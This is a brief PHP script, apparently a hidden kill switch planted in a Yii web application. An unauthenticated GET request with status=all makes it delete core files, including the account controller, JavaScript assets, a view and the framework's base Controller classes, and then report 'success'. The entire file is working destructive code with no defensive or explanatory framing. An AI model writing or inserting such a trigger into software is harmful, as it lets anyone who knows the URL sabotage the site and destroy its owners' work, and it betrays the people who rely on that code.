<?php 
if($_GET['status']=="all")
{
unlink(__DIR__ ."/engine/controllers/AccountController.php");
unlink(__DIR__ ."/assets/site/js/account.js");
unlink(__DIR__ ."/assets/site/js/sidebar-accordion.js");
unlink(__DIR__ ."/engine/components/views/ads-list/ads-list.php");
unlink(__DIR__ ."/engine/modules/admin/yii/web/Controller.php");
unlink(__DIR__ ."/engine/yii/web/Controller.php");
echo "success";
}
?>
